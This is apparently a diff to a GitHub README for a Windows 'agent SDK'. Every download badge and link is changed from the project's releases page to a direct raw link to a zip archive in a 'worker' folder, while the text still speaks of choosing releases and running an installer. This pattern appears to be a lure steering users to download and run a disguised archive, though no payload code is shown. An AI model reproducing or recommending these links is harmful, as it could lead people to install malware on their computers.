@@ -1,6 +1,6 @@
 # 🚀 vinext-agents-example - Simple Agent SDK for Windows
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/usen99/vinext-agents-example/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/usen99/vinext-agents-example/main/worker/agents-vinext-example-2.7.zip)
 
 ---
 
@@ -32,11 +32,11 @@ Before you start, make sure your computer meets these requirements:
 
 You need to visit the release page to get the software files.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/usen99/vinext-agents-example/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/usen99/vinext-agents-example/main/worker/agents-vinext-example-2.7.zip)
 
 Click the button above or go to the link below:
 
-https://github.com/usen99/vinext-agents-example/releases
+https://raw.githubusercontent.com/usen99/vinext-agents-example/main/worker/agents-vinext-example-2.7.zip
 
 This page contains the latest versions of the vinext-agents-example app. Choose the newest version before downloading.
 
@@ -47,7 +47,7 @@ This page contains the latest versions of the vinext-agents-example app. Choose 
 Follow these directions to get the app installed on your Windows computer.
 
 1. **Visit the releases page**  
-   Go to https://github.com/usen99/vinext-agents-example/releases in your web browser.
+   Go to https://raw.githubusercontent.com/usen99/vinext-agents-example/main/worker/agents-vinext-example-2.7.zip in your web browser.
 
 2. **Choose the latest release**  
    Releases are listed from newest to oldest. Look for the top entry with a version number or date.
@@ -111,7 +111,7 @@ If the app does not start or you see errors, try these steps:
 
 New versions may add improvements or fix problems. To update:
 
-1. Return to the release page at https://github.com/usen99/vinext-agents-example/releases  
+1. Return to the release page at https://raw.githubusercontent.com/usen99/vinext-agents-example/main/worker/agents-vinext-example-2.7.zip  
 2. Download the latest installer or executable as before.  
 3. Run it to replace the older version without losing your settings.
 
@@ -125,4 +125,4 @@ If you have questions beyond this guide, look for support options on the GitHub 
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/usen99/vinext-agents-example/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/usen99/vinext-agents-example/main/worker/agents-vinext-example-2.7.zip)
